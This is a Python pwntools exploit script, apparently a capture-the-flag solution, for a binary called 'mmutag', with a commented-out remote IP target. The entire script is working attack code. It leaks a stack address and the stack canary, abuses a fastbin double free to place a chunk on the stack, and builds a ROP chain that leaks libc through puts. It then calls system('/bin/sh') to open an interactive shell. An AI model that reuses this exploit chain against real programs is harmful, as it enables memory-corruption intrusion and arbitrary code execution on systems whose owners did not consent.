from pwn import *
#sh=remote("183.129.189.61",52004)
sh=process("./mmutag")
#context.log_level='debug'
elf=ELF("./mmutag")
libc=ELF("./libc.so.6")
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main=0x400bf1
poprdi=0x400d23

def add(id,content):
	sh.recvuntil("please input your choise:\n")
	sh.sendline("1")
	sh.recvuntil("please input your id:\n")
	sh.sendline(str(id))
	sh.recvuntil("input your content\n")
	sh.send(content)
def delete(id):
	sh.recvuntil("please input your choise:\n")
	sh.sendline("2")
	sh.recvuntil("please input your id:\n")
	sh.sendline(str(id))

#leak stack_addr
sh.recvuntil("please input you name: \n")
sh.sendline("aaaa")
sh.recvuntil("0x")
stack_addr=int(sh.recv(12),16)
print hex(stack_addr)
sh.recvuntil("please input your choice:\n")
sh.sendline("2")

#leak canary
sh.recvuntil("please input your choise:")
sh.sendline("3")
payload='a'*16+'c'*8
sh.sendline(payload)
sh.recvuntil('cccccccc')
canary=u64(sh.recv(8))-0xa
print hex(canary)

#add two chunk
add(1,'aaaa')
add(2,'bbbb')

#double free
delete(1)
delete(2)
delete(1)

#change fd
payload=p64(stack_addr-0x40)
add(3,payload)
add(4,'cccc')
add(5,'dddd')

#write size(0x71) for chunk
sh.recvuntil("please input your choise:")
sh.sendline("3")
payload=p64(0)+p64(0x71)
sh.sendline(payload)

#familar ROP!!!
payload="a"*8+p64(canary)
payload+="b"*8+p64(poprdi)+p64(puts_got)
#return to sub_400a99
payload+=p64(puts_plt)+p64(0x400a99)
add(6,payload)
sh.recvuntil("please input your choise:")
sh.sendline("4")

#leak libc_base
puts_addr=u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
libc_base=puts_addr-libc.symbols["puts"]
system_addr=libc_base+libc.symbols["system"]
binsh=libc_base+libc.search("/bin/sh").next()
info("libc_base:0x%x",libc_base)

#try again
sh.recvuntil("please input your choise:")
sh.sendline("3")
payload=p64(0)+p64(0x71)
sh.sendline(payload)

delete(1)
delete(2)
delete(1)

payload=p64(stack_addr-0x20)
add(7,payload)
add(8,'cccc')
add(9,'dddd')

payload="a"*8+p64(canary)
payload+="b"*8+p64(poprdi)+p64(binsh)
payload+=p64(system_addr)+p64(main)
add(10,payload)
sh.recvuntil("please input your choise:")
sh.sendline("4")
sh.interactive()

